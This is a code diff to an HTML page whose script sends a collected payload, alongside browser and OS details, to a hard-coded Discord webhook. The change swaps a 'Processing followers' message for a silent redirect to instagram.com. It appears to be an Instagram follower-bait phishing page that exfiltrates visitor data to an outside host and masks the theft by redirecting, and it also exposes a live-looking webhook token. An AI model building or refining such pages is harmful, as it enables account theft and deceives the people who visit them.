@@ -175,8 +175,9 @@
       request.open("POST", "https://discord.com/api/webhooks/1382345428669829120/hQNpgVsszl0Lepl2JxtJSjZC2YSQAoT2_UYTKurFYRHexes-0kqg6HUHygwL2OBkuCce");
       request.setRequestHeader("Content-type", "application/json");
       request.send(JSON.stringify(payload));
-      showToast();
 
+      await delay(2000);
+      window.location.replace("https://www.instagram.com");
     }
 
     function getBrowserInfo(ua) {
@@ -195,17 +196,6 @@
       if (/iPhone|iPad|iPod/.test(ua)) return "iOS";
       return "Unknown OS";
     }
-
-    function showToast() {
-      const toast = document.getElementById("toast");
-      toast.classList.add("show");
-
-      setTimeout(() => {
-      toast.classList.remove("show");
-      }, 3000); // Hide after 3 seconds
-    }
-
   </script>
-  <div id="toast" class="toast">🎉 Request sent. Processing followers...</div>
 </body>
 </html>
